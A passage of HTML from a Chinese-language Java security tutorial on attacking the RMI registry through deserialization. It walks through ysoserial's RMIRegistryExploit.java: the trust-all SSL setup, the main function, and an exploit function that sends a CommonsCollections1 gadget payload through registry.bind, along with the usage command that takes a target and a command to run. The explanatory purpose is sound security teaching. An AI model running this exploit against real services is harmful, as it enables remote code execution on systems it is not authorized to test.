+                <span class="n">var6</span><span class="o">.</span><span class="na">unbind</span><span class="o">(</span><span class="n">var7</span><span class="o">);</span>
+
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">var2</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">break</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var80</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling return"</span><span class="o">,</span> <span class="n">var80</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="k">default</span><span class="o">:</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"invalid method number"</span><span class="o">);</span>
+            <span class="o">}</span>
+</pre></div>
+<p>这里我们可以得知，Registry注册中心能够接收bind/rebind/unbind/look/list/请求，而在接收五类请求方法的时候，只有我们bind，rebind，unbind和look方法进行了反序列化数据调用readObject函数，可能导致直接触发了反序列化漏洞产生。</p>
+<p>而我们往下跟踪这五类方法请求，发现也是在RegistryImpl_Stub中进行定义。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210302102259-34e420f6-7afe-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Remote</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">NotBoundException</span> <span class="o">{</span>
+        <span class="kd">synchronized</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Remote</span> <span class="n">var3</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var3</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">NotBoundException</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">var3</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">bind</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Remote</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span><span class="o">,</span> <span class="n">AccessException</span> <span class="o">{</span>
+        <span class="n">checkAccess</span><span class="o">(</span><span class="s">"Registry.bind"</span><span class="o">);</span>
+        <span class="kd">synchronized</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Remote</span> <span class="n">var4</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var4</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">AlreadyBoundException</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="n">var2</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">unbind</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">NotBoundException</span><span class="o">,</span> <span class="n">AccessException</span> <span class="o">{</span>
+        <span class="n">checkAccess</span><span class="o">(</span><span class="s">"Registry.unbind"</span><span class="o">);</span>
+        <span class="kd">synchronized</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Remote</span> <span class="n">var3</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var3</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">NotBoundException</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rebind</span><span class="o">(</span><span class="n">String</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Remote</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">AccessException</span> <span class="o">{</span>
+        <span class="n">checkAccess</span><span class="o">(</span><span class="s">"Registry.rebind"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">bindings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="n">var2</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>针对这个攻击场景，我们可以用ysoserial中的RMIRegistryExploit.java进行分析讲述，因为这块代码比较多，我将RMIRegistryExploit.java分为三个模块来讲解。</p>
+<p>RMIRegistryExploit.java的常见使用命令如下：</p>
+<div class="highlight"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0.4</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">exploit</span><span class="o">.</span><span class="na">RMIRegistryExploit</span> <span class="n">目标地址</span> <span class="n">端口号</span> <span class="n">CommonsCollections1</span> <span class="s">"calc"</span>
+</pre></div>
+<p>很多时候，我们都是直接使用上面这种命令来进行RMI漏洞服务测试，其实本质就是通过bind请求攻击RMI注册中心。我们先看看其模块代码来进行分析。</p>
+<p>TrustAllSSL模块</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">TrustAllSSL</span> <span class="kd">implements</span> <span class="n">X509TrustManager</span> <span class="o">{</span>
+        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">X509Certificate</span><span class="o">[]</span> <span class="n">ANY_CA</span> <span class="o">=</span> <span class="o">{};</span>
+        <span class="kd">public</span> <span class="n">X509Certificate</span><span class="o">[]</span> <span class="nf">getAcceptedIssuers</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="n">ANY_CA</span><span class="o">;</span> <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">checkServerTrusted</span><span class="o">(</span><span class="kd">final</span> <span class="n">X509Certificate</span><span class="o">[]</span> <span class="n">c</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span> <span class="cm">/* Do nothing/accept all */</span> <span class="o">}</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">checkClientTrusted</span><span class="o">(</span><span class="kd">final</span> <span class="n">X509Certificate</span><span class="o">[]</span> <span class="n">c</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span> <span class="cm">/* Do nothing/accept all */</span> <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">RMISSLClientSocketFactory</span> <span class="kd">implements</span> <span class="n">RMIClientSocketFactory</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="n">Socket</span> <span class="nf">createSocket</span><span class="o">(</span><span class="n">String</span> <span class="n">host</span><span class="o">,</span> <span class="kt">int</span> <span class="n">port</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">SSLContext</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">SSLContext</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"TLS"</span><span class="o">);</span>
+                <span class="n">ctx</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">TrustManager</span><span class="o">[]</span> <span class="o">{</span><span class="k">new</span> <span class="n">TrustAllSSL</span><span class="o">()},</span> <span class="kc">null</span><span class="o">);</span>
+                <span class="n">SSLSocketFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="na">getSocketFactory</span><span class="o">();</span>
+                <span class="k">return</span> <span class="n">factory</span><span class="o">.</span><span class="na">createSocket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+</pre></div>
+<p>这段TrustAllSSL代码主要是进行SSL证书认证过程，我们不必深入研究理会。</p>
+<p>main函数模块</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">// 接收参数，如目标ip地址，端口号和需要执行的命令。</span>
+        <span class="kd">final</span> <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+        <span class="kd">final</span> <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
+        <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span> <span class="o">=</span> <span class="n">args</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
+        <span class="c1">// 用于访问RMI注册表服务，返回远程调用对象</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">host</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+        <span class="kd">final</span> <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">CommonsCollections1</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getPackage</span><span class="o">().</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span>  <span class="s">"."</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="mi">2</span><span class="o">];</span>
+        <span class="c1">// 通过class.forName()加载</span>
+        <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">ObjectPayload</span><span class="o">&gt;</span> <span class="n">payloadClass</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">ObjectPayload</span><span class="o">&gt;)</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
+
+        <span class="c1">// 测试RMI注册表是否为SSL连接，如果连接失败时升级到SSL连接的rmi请求</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">registry</span><span class="o">.</span><span class="na">list</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">ConnectIOException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">host</span><span class="o">,</span> <span class="n">port</span><span class="o">,</span> <span class="k">new</span> <span class="n">RMISSLClientSocketFactory</span><span class="o">());</span>
+        <span class="o">}</span>
+
+        <span class="c1">// 调用exploit函数</span>
+        <span class="n">exploit</span><span class="o">(</span><span class="n">registry</span><span class="o">,</span> <span class="n">payloadClass</span><span class="o">,</span> <span class="n">command</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>这段main函数主要为加载payload值 CommonsCollections1，然后我们使用exploit函数去调用。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="o">(</span><span class="kd">final</span> <span class="n">Registry</span> <span class="n">registry</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">ObjectPayload</span><span class="o">&gt;</span> <span class="n">payloadClass</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">ExecCheckingSecurityManager</span><span class="o">().</span><span class="na">callWrapped</span><span class="o">(</span><span class="k">new</span> <span class="n">Callable</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;(){</span><span class="kd">public</span> <span class="n">Void</span> <span class="nf">call</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+            <span class="c1">// 获取payload进行命令执行</span>
+            <span class="n">ObjectPayload</span> <span class="n">payloadObj</span> <span class="o">=</span> <span class="n">payloadClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">payloadObj</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">"pwned"</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+            <span class="c1">// 创建动态代理，且变为Remote类型</span>
+            <span class="n">Remote</span> <span class="n">remote</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createMemoitizedProxy</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">createMap</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">payload</span><span class="o">),</span> <span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">// 使用bind方法请求调用remote对象</span>
+                <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">remote</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">Utils</span><span class="o">.</span><span class="na">releasePayload</span><span class="o">(</span><span class="n">payloadObj</span><span class="o">,</span> <span class="n">payload</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}});</span>
+    <span class="o">}</span>
+</pre></div>
+<p>这里我们得知，ysoserail中的RMIRegistryExploit.java使用了远程代理机制，通过sun.reflect.annotation.AnnotationInvocationHandler对remote对象进行封装，然后通过bind方法将我们的remote对象进行请求发送。如果对ysoserail远程代理机制不是很了解的，可以看下我上篇<a href="https://xz.aliyun.com/t/9197" target="_blank" title="JAVA安全基础（三）-- java动态代理机制">JAVA安全基础（三）-- java动态代理机制</a></p>
+<h2 data-content="1" id="a19dc6893df3c7733e04547e386de69f">小结</h2>
+<p>我们简单介绍了下RMI服务机制流程和ysoserial为例分析攻击RMI注册中心的场景，这仅仅只是针对RMI服务本身的攻击利用，后面更深入的还会结合JRMP和JDNI机制来进行分析讲解。如果文章有什么讲述不清或者文笔错误的话，欢迎大家指出。</p>
+<h2 data-content="1" id="2b04a61c33cb1ea60aa9c621b1058c07">参考链接</h2>
+<p><a href="https://www.cnblogs.com/pihaochen/p/11020596.html" target="_blank">https://www.cnblogs.com/pihaochen/p/11020596.html</a></p>
+<p><a href="https://xz.aliyun.com/t/9053" target="_blank">https://xz.aliyun.com/t/9053</a></p>
+<p><a href="https://xz.aliyun.com/t/7930" target="_blank">https://xz.aliyun.com/t/7930</a></p>
+<p><a href="https://xz.aliyun.com/t/6660" target="_blank">https://xz.aliyun.com/t/6660</a></p>
+<p><a href="https://xz.aliyun.com/t/7079" target="_blank">https://xz.aliyun.com/t/7079</a></p>
+</div>
+</div>
